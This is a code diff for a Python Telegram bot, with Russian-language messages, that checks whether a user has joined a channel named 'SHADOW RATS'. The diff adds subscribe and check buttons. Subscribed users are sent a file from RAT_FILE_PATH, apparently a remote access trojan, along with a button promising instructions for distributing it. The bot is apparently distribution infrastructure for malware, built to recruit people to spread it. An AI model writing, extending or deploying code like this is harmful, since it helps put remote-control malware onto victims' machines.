@@ -31,9 +31,37 @@ def send_welcome(message):
             markup.add(instruction_button)
             bot.send_message(message.chat.id, "Нажмите кнопку 'Инструкция' для получения инструкции по распространению.", reply_markup=markup)
         else:
-            bot.send_message(message.chat.id, "Вы должны быть подписаны на канал [SHADOW RATS] (https://t.me/+7U6yF05xjpljODJi) для получения доступа.", parse_mode='Markdown')
+            send_subscription_buttons(message.chat.id)
     except Exception as e:
         bot.send_message(message.chat.id, "Произошла ошибка при проверке подписки.")
+
+def send_subscription_buttons(chat_id):
+    markup = types.InlineKeyboardMarkup()
+    subscribe_button = types.InlineKeyboardButton("Подписаться", url="https://t.me/+7U6yF05xjpljODJi")
+    check_button = types.InlineKeyboardButton("Проверить", callback_data="check_subscription")
+    markup.add(subscribe_button, check_button)
+    bot.send_message(chat_id, "Вы должны быть подписаны на канал [SHADOW RATS] (https://t.me/+7U6yF05xjpljODJi) для получения доступа.", parse_mode='Markdown', reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data == "check_subscription")
+def check_subscription(call):
+    user_id = call.from_user.id
+    
+    try:
+        member = bot.get_chat_member(CHANNEL_ID, user_id)
+        if member.status in ['member', 'creator', 'administrator']:
+            bot.send_message(call.message.chat.id, "Добро пожаловать в команду SHADOW RATS.")
+            with open(RAT_FILE_PATH, 'rb') as file:
+                bot.send_document(call.message.chat.id, file)
+            
+            # Добавляем кнопку "Инструкция"
+            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+            instruction_button = types.KeyboardButton("Инструкция")
+            markup.add(instruction_button)
+            bot.send_message(call.message.chat.id, "Нажмите кнопку 'Инструкция' для получения инструкции по распространению.", reply_markup=markup)
+        else:
+            send_subscription_buttons(call.message.chat.id)
+    except Exception as e:
+        bot.send_message(call.message.chat.id, "Произошла ошибка при проверке подписки.")
 
 @bot.message_handler(func=lambda message: message.text == "Инструкция")
 def send_instruction(message):
